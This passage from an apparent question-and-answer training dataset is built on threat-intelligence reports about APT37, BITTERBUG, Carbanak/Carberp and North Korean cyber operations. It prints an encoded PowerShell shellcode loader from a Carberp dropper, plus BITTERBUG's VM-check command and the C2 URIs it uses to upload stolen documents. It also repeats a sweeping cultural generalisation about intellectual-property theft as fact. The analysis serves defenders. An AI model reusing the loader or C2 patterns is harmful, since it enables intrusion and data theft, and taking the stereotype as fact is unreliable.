    "output": "SockDetour, as a backup backdoor in the TiltedTemple campaign, facilitates the loading and execution of a plugin DLL through a multi-step process. First, after sharing the session key, SockDetour receives four bytes of data indicating the length of the final payload, which is expected to be up to five MB. This payload data is encrypted using the shared session key. Upon decryption, the data is in JSON format containing two objects: 'app' and 'args'. The 'app' object holds a base 64-encoded DLL, while 'args' contains arguments to be passed to the DLL. SockDetour loads this DLL into a newly allocated memory space and calls an export function named 'ThreadProc' with specific arguments. These arguments include the hijacked socket, session key, and arguments received from the client. Although no plugin DLL samples were discovered, the function arguments suggest that the plugin likely communicates via the hijacked socket and encrypts transactions using the session key, ensuring it operates as stealthily as SockDetour.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nOn Feb. 2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper). Recent examination of this group's activities by FireEye iSIGHT Intelligence reveals APT37 has expanded its operations in both scope and sophistication. APT37's toolset, which includes access to zero-day vulnerabilities and wiper malware, combined with heightened tensions in Northeast Asia and North Korea's penchant for norm breaking, means this group should be taken seriously.\nWe assess with high confidence that this activity is carried out on behalf of the North Korean government given malware development artifacts and targeting that aligns with North Korean state interests. FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as Scarcruft and Group123.\nWe judge that APT37's primary mission is covert intelligence gathering in support of North Korea's strategic military, political and economic interests. This is based on consistent targeting of South Korean public and private entities and social engineering. APT37's recently expanded targeting scope also appears to have direct relevance to North Korea's strategic interests.\nFrom 2014 to 2017, APT37 targeting concentrated primarily on the South Korean government, military, defense industrial base, and media sector. Lure materials (Fig. 2) typically leveraged the Korean language and featured themes such as Korean peninsula reunification or sanctions.\nFigure 2. \"2016 Korean\nReunification Conference Form\" (MD5:183be2035d5a546670d2b9deeca4eb59).\nIn 2017, APT37 targeted a Middle Eastern company that entered into a joint venture with the North Korean government to provide telecommunications service to the country (read on for a case study). At that time, other targets included individuals involved in international affairs and trade issues, the general director of a Vietnamese international trading and transport company, and possibly individuals working with Olympics organizations assisting in securing resources for athletes.\nNorth Korean defector and human rights-related targeting provides further evidence that APT37 conducts operations aligned with the interests of North Korea.\nAPT37 targeted a research fellow, advisory member, and journalist associated with different North Korean human rights issues and strategic organizations. It also targeted an entity in Japan associated with the United Nations missions on sanctions and human rights. APT37 distributed SLOWDRIFT malware using a lure referencing the Korea Global Forum against academic and strategic institutions located in South Korea. Notably, the email was sent from a compromised South Korean institute that conducts studies on North Korea. The string \"durihana,\" which is also the name of a Christian missionary organization that works with North Korean defectors, was included in an APT37 weaponized document sent to an individual who works with a North Korean human rights organization.\nCASE STUDY:\nTargeting of Middle Eastern Organization with Business ties to North Korea\nWe believe a Middle Eastern organization was targeted by APT37 because it had been involved with a North Korean company and a business deal went bad. This firm was targeted shortly after media reports of this schism had gone public. The targeting effort may have been an attempt by the North Korean government to gather information on a former business partner. The operation exemplifies APT37's tactics, techniques and procedures (TTPs), and reflects the advanced capabilities of this espionage group.\nIn May 2017, APT37 used a bank liquidation letter as a spear phishing lure against a board member of a Middle Eastern financial company. The specially crafted email included an attachment containing exploit code for CVE-2017-0199, a vulnerability in Microsoft Office that had been disclosed just a month earlier. Once opened, the malicious document communicated with a compromised website, most likely to surreptitiously download and install a backdoor called SHUTTERSPEED (MD5: 7c2ebfc7960aac6f8d58b37e3f092a9c). The tool would enable APT37 to collect system information, take screenshots and download additional malicious files to the victim computer.\nQ: What specific tactics, techniques, and procedures (TTPs) did APT37 employ in the case study involving the targeting of a Middle Eastern organization with business ties to North Korea, and how did these TTPs reflect the group's advanced capabilities?",
    "output": "In the case study involving the targeting of a Middle Eastern organization with business ties to North Korea, APT37 employed several advanced tactics, techniques, and procedures (TTPs). They used a bank liquidation letter as a spear phishing lure against a board member of a Middle Eastern financial company. The email contained an attachment with exploit code for CVE-2017-0199, a recently disclosed vulnerability in Microsoft Office. Upon opening the document, it communicated with a compromised website to download and install a backdoor called SHUTTERSPEED. This backdoor enabled APT37 to collect system information, take screenshots, and download additional malicious files to the victim's computer. These TTPs reflect APT37's advanced capabilities, including the ability to quickly leverage newly discovered vulnerabilities and deploy sophisticated malware to gain persistent access to targeted systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: C:\\Intel\\Logs\\file.pdb Fig 11:\t\n  Generic\t\n  Deb Pa h\nFigure 11: Generic Debug Path\nBetween December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR) files. One from December contained several BITTERBUG variants and used a decoy PDF document (Figure 12) related to the December arrest of Devyani Khobragade,47 an Indian diplomat in the United States. In spring 2014, we observed a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysia Airlines Flight 37048 (cast as a Pakistan-related hijacking). This SFXRAR contained the latest BITTERBUG variant, which had new dependencies on support components. Interestingly, this SFXRAR's filename was the only lure element related to the MH370 event; it did not contain a decoy document. We provide a more detailed report on this SFX and the related variant in Appendix A: Malware Details.\nBITTERBUG continued to rely on the same network behaviors to communicate with its C2s. Connections to its C2 nodes relied on PHP and used communications that included \".php?compname=\" and \".php?srs=\", as well as direct file/component retrieval from the C2s. Though many of the samples that we have observed use direct IPs for HTTP communications, we have also observed more limited use of a No-IP domain.\n47 http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/\n48 http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-outage-during-the-early-part-of-its-flight-2014-6\nBig Headline: Conclusion\nOperation Arachnophobia consists of an apparent targeted exploitation campaign, dating back to early 2013, using the BITTERBUG malware family and seemingly directed against entities involved in India-Pakistan issues. The threat actor appears to have exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S. hosting services, for both the delivery and C2 phases of attack. Research later identified that a Pakistan-based VPSNOC representative had a social network affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements.\nAfter the August 6, 2013 blog, Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG activity, however, this explanation contained discrepancies. The TCIRT addressed some of these discrepancies with Tranchulas personnel, who were unresponsive, increasing our suspicion of the activity. We later observed BITTERBUG activity following August 2013 with subtle changes that further generalized debug paths. It was this chain of events that served as a catalyst for extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information.\nWhile we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who are involved in India-Pakistan issues. Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed part of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and origins (behind U.S. infrastructure), before and after public disclosure in August 2013.\nOn the surface, BITTERBUG serves as an example of how threat actors mask their operations across social, cultural and geographic boundaries. More importantly, it demonstrates the value of threat intelligence sharing and industry collaboration. As one organization begins to pull at a thread of evidence and share their findings with another, a larger understanding and shared perspective is revealed. It is through this process that a shared awareness emerges into a larger, more comprehensive story that explains what we are seeing and why - ultimately it is this story that better serves us all.\nMedium Headline: BITTERBUG\nBITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings, and automatically transferring selected files to its command and control (C2) server. BITTERBUG appears to be virtual machine aware and may not execute on a VMWare or VirtualBox VM. We have observed BITTERBUG installed by a self-extracting RAR archive disguised as a screensaver. Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and the BITTERBUG executable. The timeline below is of BITTERBUG activity from May 2013 through March 2014.\nTimeline of BITTERBUG characteristics vs.ThreatConnect events\nMedium Headline: Details\nUpon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:\n\u2022 libcurld.dll \u2013 Used for downloading and uploading files\n\u2022 msvcm90d.dll \u2013 C runtime library\n\u2022 msvcp90d.dll \u2013 C runtime library\n\u2022 msvcr90d.dll \u2013 C runtime library\nThe self-extracting RAR may install the following benign configuration files:\n\u2022 Microsoft.VC90.DebugCRT.manifest \u2013 Compilation artifact\n\u2022 BtcirEt.DZU \u2013 Self-extracting RAR configuration file\n\u2022 SJeXSrA.KNX \u2013 Self-extracting RAR configuration file\n\u2022 VCAKSQl.TNT \u2013 Self-extracting RAR configuration file\nBITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a virtual machine (VM):\n\u2022 cmd.exe /c wmic diskdrive list brief >\n\"%APPDATA%\\Microsoft\\recovery.txt\"\nBITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware. The backdoor then may enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13).\nNext BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised system. An example beacon request is shown in Figure 14.\nAccept: */*\nContent-Length: 25\nContent-Type: application/x-www-form-urlencoded\n<%COMPUTERNAME%>_<%USERNAME%>\nFigure 14: Initial C2 beacon\nBITTERBUG then may perform an HTTP GET request for the following URI:\nhttp://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\nIf the C2 server responds with a filename, the filename received is deleted from %APPDATA%\\Microsoft<FILE_NAME_FROM_ C2>. The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this command occurring in the wild.\nBITTERBUG then may attempt to download the files listed in Table 1. The purpose of the first three files is unknown. The final two files are downloaded to the user's Startup directory and executed at startup in order to maintain persistence.\nNext, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: .doc, .ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx\nBITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to the following locations:\n\u2022 %APPDATA%\\Microsoft\\plang006.txt\n\u2022 %APPDATA%\\Microsoft\\tlang006.txt\nBITTERBUG may also write a list of all running processes to:\n\u2022 %APPDATA%\\Microsoft\\prc.dat\nFinally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:\n\u2022 http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>\nMedium Headline: File Manipulations\nWe observed other interesting operational security-oriented challenges in the post-blog post samples. In one case, an actor appeared to manually null out the \"Cert-India\" user directory in one of the file paths (see figures 15 and 16 below) contained in two binaries (support components). These files shared the same import hash (4e96e86db5a8a025b996aefdc218ff74) and were virtually the same files minus modification to a few bytes in the second sample.\nAs these samples point to, we also observed use of the C++ Boost libraries, which introduced a new file path to monitor for operational security purposes. We observed at least one case in which files mixed old and new file paths, as seen in the figures 17 and 18 below.\nIn both cases, it is possible that the actors intentionally did this in an attempt to mislead further research efforts into post-blog samples or cast suspicion on \"Cert-India\" as a more-revealing element. For example, analysis of files deployed alongside the nulled-out \"Cert-India\" sample mentioned above revealed a lack of concern over the same string. Alternatively, these inconsistencies could also indicate sloppy tradecraft and/or teamwork.\nC:\\Users\\Cert-\nIndia\\Documents\\boost_1_53_0\\boost/thread/win32/thread_primitives.hpp\n\nAnswer this question based on the above context: Describe the installation process and initial actions of BITTERBUG upon execution. What steps does it take to detect virtual machines and establish communication with its C2 server?",
    "output": "Upon execution, BITTERBUG is installed by a self-extracting RAR archive, which may be disguised as a screensaver. This archive extracts configuration files, dependency DLLs, and the BITTERBUG executable. The initial action involves executing a WMI command to detect the presence of a virtual machine by checking for strings 'VBox' or 'VMware' in the output file 'recovery.txt'. If a VM is detected, BITTERBUG enters an infinite sleep loop. Following this, BITTERBUG beacons to the C2 server by sending the computer name and username of the compromised system. It then performs an HTTP GET request to check for updates or commands from the C2 server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Summary\nDoes North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the U.S. and its allies? While North Korea's cyber warfare capabilities pale in comparison to those of wealthier nations, the regime has made significant progress in developing its infrastructure and in establishing cyber operations. The rate of this progress warrants a closer look at North Korea's motivations, TTPs, and capabilities. As noted above, North Korea views the U.S. and South Korea as its primary adversaries. The U.S. and South Korea are high-tech nations with economies that\ndepend heavily on technology.398 In contrast, North Korea does not have a high tech culture. For these reasons, we should not overestimate the regime's advanced cyber capability, yet we should never underestimate the potential impact of North Korea utilizing less advanced, quick-and-dirty tactics like DDoS to cripple their high-tech targets. Both government and corporate entities are susceptible to being targeted by North Korean cyber attacks. North Korean juche ideology places the survival of the regime as its primary goal, and any perceived threat to the regime may be targeted. Several attacks on U.S. and South Korean government, financial, and critical infrastructure entities have been attributed to North Korean origins.. These attacks were often preceded by or occurred in conjunction with North Korea voicing negative sentiments about the targeted entities. As we saw with Iranian cyber actors in , 399 state sponsored cyber actors often launch an attack in response to a political trigger. The same pattern seems to apply to pro-North Korean cyber actors, who have launched attacks to coincide with U.S. Independence Day and the anniversary of the start of the Korean War, as well as propaganda and cyber attacks in response to joint military exercises between the U.S. and South Korea.400 401\n396 http://www.foxnews.com/world/2012/04/03/exclusive-cash-for-computers-is-un-busting-its-own-sanctions-in-north-korea/\n397 http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4\nAs shown by North Korea's past behavior (which is consistent with their doctrine), they are easily \"pushed into a corner\". At the slightest perceived threat, the regime responds with saber-rattling and peacocking. The regime is extremely defensive and will, in turn, flex its muscles to show the world how capable it is, even if this is an inaccurate display of their overall capabilities.\nThe regime fears losing its control and the nation's culture to the ever-growing threat of outside influence, as is evidenced in the regime's reaction to the comedy film \"The Interview\". The regime has represented itself to its citizens as a powerful and capable entity and has used this status to control the populace. For this reason, the regime's leaders are forced to continually demonstrate this strength and power, or an illusion thereof, both domestically and globally, in order to maintain the status needed to ensure continued suppression of the population. This show of power may require that the regime takes chances and stretches beyond its abilities at times, but in the spirit of juche and songun, the regime will continue this fa\u00e7ade, fearful of losing the image its leaders have worked so hard to maintain.\nMedium Headline: HP Security Research recommendations\nNorth Korean cyber operations are not generally observed originating from home field IP address space, so geo-IP based blocking of traffic originating from those net-blocks is ineffective.\n398 http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf\n399 http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U5HkbpRdV90\n400 http://www.zdnet.com/south-korea-braces-for-norths-cyberattacks-7000012587/\n401 http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war\nGiven that North Korea has capable and technically trained forces and will demonstrate their power when they feel provoked, western entities should consciously avoid promoting ideas or doctrine that is blatantly slanderous to the regime. Encouraging such ideas could cause those entities to become a focal point for North Korean cyber attacks.\nDue to the fact that North Korean infrastructure is aging and its resources are not able to keep up with the rest of the world, entities with interesting R&D or IP (intellectual property) - especially military in nature \u2013 could become targets of interest for North Korea. Interest in defense-related IP and R&D could also stem from North Korea's relationship with China. In the Chinese business culture, taking another entity's IP or R&D is not stealing \u2013 it is accepted as business as usual. It is possible that North Korea, if under Chinese influence, would adopt the same attitude, given the regime's limited capacity for homegrown innovation.\nKnown DPRK targets have been limited primarily to South Korean and U.S. organizations and government entities. For these targets, prudent measures should include:\n\uf0b7 Following traditional defense in depth approaches and security best practices\n\uf0b7 Monitoring for malware that disables Korean language antivirus software, such as that from AhnLab\n\uf0b7 To protect against the attack vectors used in North Korean malware campaigns, an advisable prevention tactic is to focus on hardening update/patch management systems. These systems are appealing targets due to the potential for a large impact\nMedium Headline: WHOIS record for silibank.net:\nDomain Name: silibank.net\nRegistry Domain ID:\nRegistrar WHOIS Server: whois.discount-domain.com\nRegistrar URL: http://www.onamae.com\nUpdated Date: 2014-03-11 17:27:55.0\nCreation Date: 2006-03-13 13:14:53.0\nRegistrar Registration Expiration Date: 2015-03-13 03:14:53.0\nRegistrar: GMO INTERNET, INC.\nRegistrar IANA ID: 49\nabuse@gmo.jp\nRegistrar Abuse Contact Email:\nRegistrar Abuse Contact Phone:\nDomain Status: ACTIVE\nRegistry Registrant ID:\nRegistrant Name: Whois Privacy Protection Service by MuuMuuDomain\nRegistrant Organization: Whois Privacy Protection Service by MuuMuuDomain\nRegistrant Street1: 2-7-21 Tenjin Chuo-ku\nRegistrant Street2: Tenjin Prime 8F\nRegistrant City: Fukuoka-shi\nRegistrant State/Province: Fukuoka\nRegistrant Postal Code: 810-0001\nJP\nRegistrant Country:\nRegistrant Phone: 81-927137999\nRegistrant Phone Ext:\nRegistrant Fax: 81-927137944\nRegistrant Fax Ext:\nRegistrant Email: privacy@whoisprivacyprotection.info\nRegistry Admin ID:\nAdmin Name: Whois Privacy Protection Service by MuuMuuDomain\nAdmin Organization: Whois Privacy Protection Service by MuuMuuDomain\nAdmin Street1: 2-7-21 Tenjin Chuo-ku\nAdmin Street2: Tenjin Prime 8F\nAdmin City: Fukuoka-shi\nAdmin State/Province: Fukuoka\nAdmin Postal Code: 810-0001\nAdmin Country: JP\nAdmin Phone: 81-927137999\nAdmin Phone Ext:\nAdmin Fax: 81-927137944\nAdmin Fax Ext:\nAdmin Email: privacy@whoisprivacyprotection.info\nRegistry Tech ID:\nTech Name: Whois Privacy Protection Service by MuuMuuDomain\nTech Organization: Whois Privacy Protection Service by MuuMuuDomain\nTech Street1: 2-7-21 Tenjin Chuo-ku\nTech Street2: Tenjin Prime 8F\nTech City: Fukuoka-shi\nTech State/Province: Fukuoka\nTech Postal Code: 810-0001\nTech Country: JP\nTech Phone: 81-927137999\nTech Phone Ext:\nTech Fax: 81-927137944\nTech Fax Ext:\nTech Email: privacy@whoisprivacyprotection.info\nName Server: ns1.dns.ne.jp\nName Server: ns2.dns.ne.jp\nMedium Headline: WHOIS Record for kcna.kp:\ninetnum: 175.45.176.0 - 175.45.179.255\nnetname: STAR-KP\ndescr: Ryugyong-dong\ndescr: Potong-gang District\ncountry: KP\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nstatus: ALLOCATED PORTABLE\nmnt-by: APNIC-HM\nmnt-lower: MAINT-STAR-KP\nmnt-routes: MAINT-STAR-KP\nremarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nremarks: This object can only be updated by APNIC hostmasters.\nremarks: To update this object, please contact APNIC\nremarks: hostmasters and include your organisation's account\nremarks: name in the subject line.\nremarks: -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nmnt-irt: IRT-STAR-KP\nchanged: 20091221\nsource: APNIC\nirt: IRT-STAR-KP\naddress: Ryugyong-dong Potong-gang District\ne-mail:\nabuse-mailbox:\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nauth: # Filtered\nmnt-by: MAINT-STAR-KP\nchanged: 20120202\nsource: APNIC\nrole: STAR JOINT VENTURE CO LTD - network administrat\naddress: Ryugyong-dong Potong-gang District\ncountry: KP\nphone: +66 81 208 7602\nfax-no: +66 2 240 3180\ne-mail:\nadmin-c: SJVC1-AP\ntech-c: SJVC1-AP\nnic-hdl: SJVC1-AP\nmnt-by: MAINT-STAR-KP\nchanged: 20091214\nsource: APNIC\n\nQ: What motivates North Korea to target entities with valuable intellectual property (IP) and research and development (R&D), and how might this relate to its relationship with China?",
    "output": "A: North Korea's aging infrastructure and limited resources make it difficult for the regime to keep up with technological advancements. Entities with valuable IP and R&D, especially those related to military technology, become attractive targets for North Korea. This interest may also be influenced by North Korea's relationship with China, where taking another entity's IP or R&D is not considered stealing but rather an accepted business practice. Given North Korea's limited capacity for homegrown innovation, it may adopt a similar attitude under Chinese influence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ADDITIONAL RESOURCES\n\u2022 For more information on Iranian government-sponsored malicious cyber activity, see and .\n\u2022 For information and resources on protecting against and responding to ransomware, refer to , a centralized, whole-of-government webpage providing ransomware resources and alerts.\n\u2022 The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.\n\u2022 CISA offers a range of no-cost to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.\n\u2022 The U.S. Department of State's Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the website for more information and how to report information securely.\nQuestion: How can cybersecurity professionals leverage the resources mentioned in the report to protect against and respond to MuddyWater's malicious activities?",
    "output": "Answer: Cybersecurity professionals can leverage several resources to protect against and respond to MuddyWater's malicious activities. Firstly, they can refer to specific advisories and reports on Iranian government-sponsored malicious cyber activity for detailed insights. Additionally, the StopRansomware.gov website provides comprehensive resources and alerts specifically tailored to protecting against and responding to ransomware attacks. The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States offers guidance on hunting or investigating network threats and common mistakes to avoid in incident handling. Furthermore, CISA offers no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats. Lastly, the U.S. Department of State's Rewards for Justice (RFJ) program incentivizes reporting of foreign government malicious activity against U.S. critical infrastructure, offering rewards of up to $10 million.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. EXECUTIVE SUMMARY\nnoun\n/'sin-di-k\u04d9t/\n1. a group of individuals or organizations combined to promote some common interest.\nThe criminal gangs of the  syndicate have been attributed to numerous intrusions in the banking, hospitality, retail and other industrial verticals, collecting financial information of all kinds. The name Carbanak comes from \"Carberp,\" a banking Trojan whose  was leaked, and Anunak, a custom Trojan that has  over the years. Since at least 2015, the group appears to have fragmented into smaller, loosely related groups, each with its own preferred toolsets and Trojans, although many similarities in tactics, techniques and procedures (TTPs) exist.\nUsing APT-style tactics and techniques, the perpetrators compromise an organization, quickly escalate privileges and begin searching for any system that could access the financial data of interest. This ranges from scanning the network via WMI to look for running process names containing clear text credit card information, to monitoring a user's screen to learn how to operate the systems used to process financial information. Once they find these data and a method to access this financial information, they begin bulk harvesting. If it is credit card track data, it can be turned around and sold on in bulk. ATM and SWIFT data require more and less legwork, respectively.\nBased on these tactics, the Carbanak/FIN7 syndicate is oftentimes considered an APT. Given our research, RSA disagrees with this classification. While the group is an extremely persistent threat, they are not advanced and don't demonstrate having access to zero-day exploits or innovative tools. This gives network defenders the edge in protecting their financial data. With proper visibility and control sets in place, an analyst can easily identify these techniques and remediate quickly, thus shortening attacker dwell time and helping to prevent exfiltration of sensitive data.\nDuring the course of investigation, RSA Research observed Carbanak actors employing a handful of unique Trojans, along with freely available malware, to persist and move laterally once a network foothold was established. While many of these methods are novel, they are also well-known in the penetration testing industry. This is most likely by design, as many of these remote administration tools are frequently used by network administrators for legitimate purposes and would not have antivirus coverage or seem out of the ordinary. Employing the least sophisticated methods available, the Carbanak actors safeguard more advanced tools from being identified, and potentially invalidated, through static or behavioral detection techniques.\nThis paper reviews the characteristics of Carbanak's known Trojans and TTPs to provide network defenders a better understanding of the group's capabilities and history. Armed with this knowledge, defenders should be able to better assess risk and allocate resources to the appropriate blind spots that plague most modern networked organizations.\nSmall Headline: 2.1.2. Carberp\nThe Carberp banking Trojan is responsible for the first half of the name Carbanak. This Trojan has been around at least since 2010 with the\nCarberp was likely chosen by the actors for both its plug-in capability and code availability. This provides some operational obscurity for Carbanak/ FIN7, as numerous variants of this code were used (and remain in use) by other Crimeware actors. RSA\u00ae has dealt with these specific Carbanak/FIN7 actors multiple times, with this variant analyzed by RSA Research.\nThe droppers come in two versions, 32-bit and 64-bit. We will look at the 32-bit version.\nMetadata\nFile Name:  ml.exe\nFile Size:  96256 bytes\nMD5:  608b8bc44a59e2d5c6bf0c5ee5e1f517\nSHA1:   37de1791dca31f1ef85a4246d51702b0352def6d\nPE Time:  0x658ACD2B [Tue Dec 26 12:55:07 2023 UTC] Sections (4):\nName   Entropy  MD5\n.text   6.9   6b51c476e9cae2a88777ee330b639166\n.rdata  4.85   ad94fa5c9ff3adcdc03a1ad32cee0e3a\n.data  1.2   2e2bc95337c3b8eb05467e0049124027\n.rsrc   4.13   7396ce1f93c8f7dd526eeafaf87f9c2e\nFigure 13: Carberp Dropper Metadata\nThe first noticeable item is that the compile time seems to be in the future. In RSA NetWitness Endpoint, the compile time can be added in the Global Modules List and sorted on. The two extremes are generally where the interesting modules can be found, either a very long time ago or sometime in the future.\nWhen executed, the dropper checks to see if PowerShell is on the system and then creates registry keys in \"HKEY_CURRENT_USER\\Software\\Licenses.\" \"HKEY_CURRENT_USER\" specifies the logged-on user profile, meaning this malware will only launch when the user who ran the dropper logs on. This technique is oftentimes labelled as \"file-less malware,\" but the user's Registry Hive, NTUSER.dat, is a hidden file residing in the user's root directory.\nOn Windows Vista and newer Microsoft operating systems, this is in C:\\ Users\\<username>\\; older Windows versions reside in C:\\Documents and Settings\\<username>\\.\nThis represents a problem for the incident responder, as the malware is not present in memory, only in the registry, unless the specific user is logged on. This is an interesting way to avoid detection by endpoint detection and response (EDR) tools. Using a bit of creativity and PowerShell, responders can build a script that queries for user profiles and retrieves the actual Registry Hive or queries for the registry key itself.\nThe first registry key created is {01838681CA59881EA} and contains the binary shellcode used to unpack the encoded payload DLL. The second key is {01838611EAC11772E} and contains a base 64 encoded PowerShell command (Figure 14).\nPowerShell Command Encoded\nw=new ActiveXObject('WScript.Shell');w.Run('powershell.exe -noexit -enc \"JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQB uAGMAZQA9ACcAUwB0AG8AcAAnAAoAJABzAD0AKABHAGUAdAAt AEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACA ASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATABpAGMA ZQBuAHMAZQBzACkALgAnAHsAMAAxADgAMwA4ADYAOAAxAEMA QQA1ADkAOAA4ADEARQBBAH0AJwAKACQAbAA9ACQAcwAuAEwA ZQBuAGcAdABoAAoAJABjAD0AQAAiAAoAWwBEAGwAbABJAG0AcA BvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF 0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ AZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaA ByAGUAYQBkACgASQBuAHQAUAB0AHIAIABhACwAdQBpAG4AdAAg AGIALABJAG4AdABQAHQAcgAgAGMALABJAG4AdABQAHQAcgAgAG QALAB1AGkAbgB0ACAAZQAsAEkAbgB0AFAAdAByACAAZgApADsAC gBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzA DIALgBkAGwAbAAiACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGE AdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgB pAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAg AGEALAB1AGkAbgB0ACAAYgAsAHUAaQBuAHQAIABjACwAdQBpAG 4AdAAgAGQAKQA7AAoAIgBAAAoAJABhAD0AQQBkAGQALQBUAHk AcABlACAALQBtAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbw BuACAAJABjACAALQBOAGEAbQBlACAAJwBXAGkAbgAzADIAJwAgA C0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4A YwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQAKACQAY gA9ACQAYQA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKA AwACwAJABsACwAMAB4ADMAMAAwADAALAAwAHgANAAwACkA CgBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB 0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAG\nEAbABdADoAOgBDAG8AcAB5ACgAJABzACwAMAAsACQAYgAsACQA bAApAAoAJABhADoAOgBDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZA AoADAALAAwACwAJABiACwAMAAsADAALAAwACkAfABPAHUAdA AtAE4AdQBsAGwA\"',0,0);\nFigure 14: Encoded PowerShell Command\nThis PowerShell script imports VirtualAlloc and CreateThread from Kernel32, copies the shellcode to a segment of memory with PAGE_EXECUTE_ READWRITE [ 0x40] and creates a thread at the returned base of the allocated memory indicated by variable $b (Figure 15). The malware then creates another registry entry at \"HKEY_CURRENT_USER\\Software\\Microsoft\\ Windows\\CurrentVersion\\Run\\mshta\" with the values shown in Figure 16.\nRead the text above and answer this question: How does the Carberp Trojan's use of PowerShell and registry keys contribute to its persistence and evasion strategies, and what countermeasures can be implemented to mitigate these risks?",
    "output": "The Carberp Trojan uses PowerShell and registry keys to achieve persistence and evade detection. By storing shellcode and encoded PowerShell commands in the registry, the malware ensures it runs whenever the specific user logs on, without being present in memory. This technique is effective against traditional EDR tools that focus on memory-resident malware. To mitigate these risks, incident responders can implement countermeasures such as regularly auditing registry keys for suspicious entries, using PowerShell scripts to query user profiles, and employing advanced endpoint protection solutions that monitor registry changes and PowerShell activity. Additionally, educating users about the risks of running unknown executables can help prevent initial infection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the internet era change the traditional 'fog of war' concept, and what new opportunities and challenges does it present for Information Warfare (IW)?",
